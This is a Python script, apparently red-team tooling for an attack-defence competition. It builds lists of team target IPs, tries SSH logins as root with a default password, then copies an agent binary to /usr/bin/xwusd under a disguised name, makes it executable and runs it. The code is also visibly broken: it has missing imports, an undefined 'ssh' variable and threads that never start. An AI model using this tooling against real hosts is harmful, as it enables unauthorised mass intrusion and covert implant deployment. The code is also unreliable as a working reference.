import paramiko
import threading


def generateTarget(common, cloud_common, teams, targets, cloud_targets):
    """
    Description: Returns a list of target ipv4 addresses based on team number and hosts

    Param:
        - [str]      common: Common octet of the competition  
        - [list/str] teams: List of teams in string 
        - [list/str] hosts: Last octet of the target machines 
    """

    total = []

    for team in teams:
        for target in targets:
            final = common + '.' + team + '.' + target 
            total.append(final)

        for cloud_target in cloud_targets:
            final = cloud_common + '.' + team + '.' + cloud_target
            total.append(final)

    return total 

def sshAttempt(ip,user,pwd):
    print("[+] SSH Login Sanity Check starting...")

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(ip, username=user, password=pwd, timeout=5)
    except paramiko.AuthenticationException:
        print("[-] Authentication failed.")
    except (paramiko.ssh_exception.NoValidConnectionsError, socket.timeout):
        print("[-] No valid connection, socket timed out")
    
    print('[+] Login Successful: '+ip+':'+user+':'+pwd)
    ssh.close()

# Argparse comes here! 
def parse():
    pass 

# TODO: Create a function which simply executes the user's command through ssh
# This function will be used for re-executing the agent file during deployment. 

# Actually drop the payload, change the file permission, and execute it 
# Warn the master to turn on the server? 
def drop(ip, user, pwd, remote_location):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(ip, username=user, password=pwd, timeout=5)
    except paramiko.AuthenticationException:
        print("[-] Authentication failed.")
    except (paramiko.ssh_exception.NoValidConnectionsError, socket.timeout):
        print("[-] No valid connection, socket timed out")
    
    # SSH Successful. Drop the agent and execute it  
    print("[+] Dropping to ", ip, "...")
    scp = paramiko.SCPClient()
    scp.put('/opt/yabnet/agent/dist/agent', remote_location)
    command = 'chmod +x ' + remote_location + ';' + remote_location
    stdin, stdout, stderr = ssh.exec_command(command)

    errs = stderr.read()
    if errs:
        print("[-] Drop FAILED: ", errs)
    else:
        print("[+] Successfully dropped and executed.")
    
        

def main():
    USER = 'root'
    PASSWORD = 'ChangeMe2019!'
    REMOTE_LOCATION = '/usr/bin/xwusd'

    # For debugging purposes... 
    common = '10.2'
    cloud_common = '10.3'
    teams = ['1','2','3','4','5','6','7','8','9','10']
    targets = ['3','4','5','7']
    cloud_targets = ['50','51']
    

    #print(generateTarget(common, cloud_common, teams, targets, cloud_targets))

    targets = generateTarget(common, cloud_common, teams, targets, cloud_targets)

    # SSH Login Sanity check 
    for target in targets:
        thread = threading.Thread(target=sshAttempt, args=(target,USER,PASSWORD))

    print("\n[+] Preparing to actually drop payload ...\n")
    time.sleep(5)

    # Actually drop payloads 
    for target in targets:
        thread = threading.Thread(target=drop, args=(target,USER,PASSWORD,REMOTE_LOCATION))

    print("\n\n\n[+] Agents all dropped. Have fun.\n\n\n")



if __name__ == '__main__':
    main()